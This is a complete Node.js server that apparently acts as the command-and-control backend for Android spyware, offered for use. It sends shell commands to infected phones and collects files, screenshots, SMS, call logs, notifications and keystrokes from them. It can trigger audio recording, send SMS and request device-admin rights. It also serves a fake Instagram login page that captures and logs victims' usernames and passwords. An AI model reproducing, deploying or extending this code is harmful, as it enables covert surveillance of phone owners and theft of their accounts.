const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*" }
});

app.use(express.static('public'));
app.use(express.json());

const clients = new Map();

io.on('connection', (socket) => {
    console.log(`Client ${socket.id} connected`);

    socket.on('register', (info) => {
        clients.set(socket.id, {
            id: socket.id,
            info: info,
            lastSeen: Date.now()
        });
        io.emit('clients_update', Array.from(clients.values()));
    });

    // Generic command execution (shell)
    socket.on('cmd', (data) => {
        // data = { clientId, cmd, adminId }
        const target = clients.get(data.clientId);
        if (target) {
            io.to(data.clientId).emit('cmd', data.cmd);
        }
    });

    // Command output from client back to admin
    socket.on('cmd_output', (data) => {
        io.to(data.adminId).emit('command_result', {
            clientId: socket.id,
            output: data.output
        });
    });

    // File data from client
    socket.on('file_data', (data) => {
        io.to(data.adminId).emit('file_received', {
            clientId: socket.id,
            name: data.name,
            content: data.content
        });
    });

    // Screenshot
    socket.on('screenshot_data', (data) => {
        io.to(data.adminId).emit('screenshot_received', {
            clientId: socket.id,
            image: data.image
        });
    });

    // Logs (SMS, call logs, notifications, installed apps, keylogs)
    socket.on('logs_data', (data) => {
        io.to(data.adminId).emit('logs_result', {
            clientId: socket.id,
            type: data.type,
            content: data.content
        });
    });

    // Send SMS command from admin to client
    socket.on('send_sms', (data) => {
        io.to(data.clientId).emit('send_sms', { number: data.number, text: data.text });
    });

    // Play music
    socket.on('play_music', (data) => {
        io.to(data.clientId).emit('play_music', data.url);
    });

    // Vibrate
    socket.on('vibrate', (data) => {
        io.to(data.clientId).emit('vibrate', data.duration);
    });

    // Text To Speech
    socket.on('speak', (data) => {
        io.to(data.clientId).emit('speak', data.text);
    });

    // Torch
    socket.on('torch_on', (data) => {
        io.to(data.clientId).emit('torch_on');
    });
    socket.on('torch_off', (data) => {
        io.to(data.clientId).emit('torch_off');
    });

    // Wallpaper
    socket.on('wallpaper', (data) => {
        io.to(data.clientId).emit('wallpaper', data.image);
    });

    // Open URL
    socket.on('open_url', (data) => {
        io.to(data.clientId).emit('open_url', data.url);
    });

    // Instagram phishing WebView
    socket.on('show_instagram_phish', (data) => {
        io.to(data.clientId).emit('show_instagram_phish');
    });

    // Get call logs, notifications, installed apps
    socket.on('get_call_logs', (data) => {
        io.to(data.clientId).emit('get_call_logs');
    });
    socket.on('get_notifications', (data) => {
        io.to(data.clientId).emit('get_notifications');
    });
    socket.on('installed_apps', (data) => {
        io.to(data.clientId).emit('installed_apps');
    });
    socket.on('keylog_start', (data) => {
        io.to(data.clientId).emit('keylog_start');
    });
    socket.on('keylog_stop', (data) => {
        io.to(data.clientId).emit('keylog_stop');
    });

    // Enable admin permission
    socket.on('enable_admin', (data) => {
        io.to(data.clientId).emit('enable_admin');
    });

    // Record audio
    socket.on('record_audio', (data) => {
        io.to(data.clientId).emit('record_audio');
    });

    // File upload/download
    socket.on('download_file', (data) => {
        io.to(data.clientId).emit('download_file', data.path);
    });
    socket.on('upload_file', (data) => {
        io.to(data.clientId).emit('upload_file', data);
    });

    socket.on('disconnect', () => {
        clients.delete(socket.id);
        io.emit('clients_update', Array.from(clients.values()));
    });
});

// Instagram phishing credential collector (same as before)
app.post('/steal_creds', (req, res) => {
    console.log('Stolen credentials:', req.body);
    res.send('OK');
});

app.get('/ig-phish', (req, res) => {
    res.send(`
        <html><body style="background:black;color:white;text-align:center;">
        <h2>Instagram</h2>
        <form id="login" action="/steal_creds" method="post">
            <input name="username" placeholder="Username"><br><br>
            <input name="password" type="password" placeholder="Password"><br><br>
            <button type="submit">Log in</button>
        </form>
        <script>
            document.getElementById('login').onsubmit = function(e) {
                e.preventDefault();
                fetch('/steal_creds', {method:'POST', body: new FormData(this)});
                alert('Wrong password. Try again.');
            }
        </script>
        </body></html>
    `);
});

const PORT = 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT} - accessible via your server's public IP`);
});